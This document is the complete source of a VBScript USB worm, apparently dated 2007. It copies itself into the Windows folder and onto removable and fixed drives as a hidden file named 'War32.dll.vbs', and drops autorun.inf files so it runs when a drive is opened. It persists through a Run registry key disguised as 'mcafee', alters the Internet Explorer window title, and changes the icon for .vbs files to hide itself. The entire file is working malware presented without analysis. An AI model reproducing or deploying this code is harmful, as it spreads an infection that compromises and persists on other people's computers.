on error resume next
'My name is Comex's v50.0
Rem.Sabtu,09juni07, [KETUT SUAR.MELAYA_BALI]?
Dim src, winpath, flashdrive, fs, mf, atr, tf, rg, nt, check, sd:atr = "[autorun]"&vbcrlf&"shellexecute=wscript.exe War32.dll.vbs":Set fs = CreateObject("Scripting.FileSystemObject"): Set mf = fs.getfile(Wscript.ScriptFullname): Dim text, size: size = mf.size: check = mf.drive.drivetype: Set text = mf.openastextstream(1, -2)
Do While Not text.atendofstream: src=src&text.readline: src = src & vbCrLf: Loop
Do: Set winpath = fs.getspecialfolder(0): Set tf = fs.getfile(winpath & "\War32.dll.vbs"): tf.Attributes = 32: Set tf = fs.createtextfile(winpath & "\War32.dll.vbs", 2, True): tf.write src: tf.Close: Set tf = fs.getfile(winpath & "\War32.dll.vbs"): tf.Attributes = 39
For Each flashdrive In fs.drives
If (flashdrive.drivetype = 1 Or flashdrive.drivetype = 2) And flashdrive.Path <> "A:" Then: Set tf = fs.getfile(flashdrive.Path & "\War32.dll.vbs"): tf.Attributes = 32: Set tf = fs.createtextfile(flashdrive.Path & "\War32.dll.vbs", 2, True): tf.write src: tf.Close: Set tf = fs.getfile(flashdrive.Path & "\War32.dll.vbs"): tf.Attributes = 39: Set tf = fs.getfile(flashdrive.Path & "\autorun.inf"): tf.Attributes = 32: Set tf = fs.createtextfile(flashdrive.Path & "\autorun.inf", 2, True): tf.write atr: tf.Close: Set tf = fs.getfile(flashdrive.Path & "\autorun.inf"): tf.Attributes = 39: End If
Next
Set rg = CreateObject("WScript.Shell"): rg.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\mcafee",winpath & "\War32.dll.vbs": rg.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Window Title", "AKU TAK PERNAH DIHARGAI ORANG![KETUT SUAR.MELAYA_BALI?!]": rg.regwrite "HKCR\vbsfile\DefaultIcon", "shell32.dll,2"
If check <> 1 Then Wscript.sleep 200000
Loop While check <> 1: Set sd = CreateObject("Wscript.shell"): sd.run winpath & "\explorer.exe /e,/select, " & Wscript.ScriptFullname
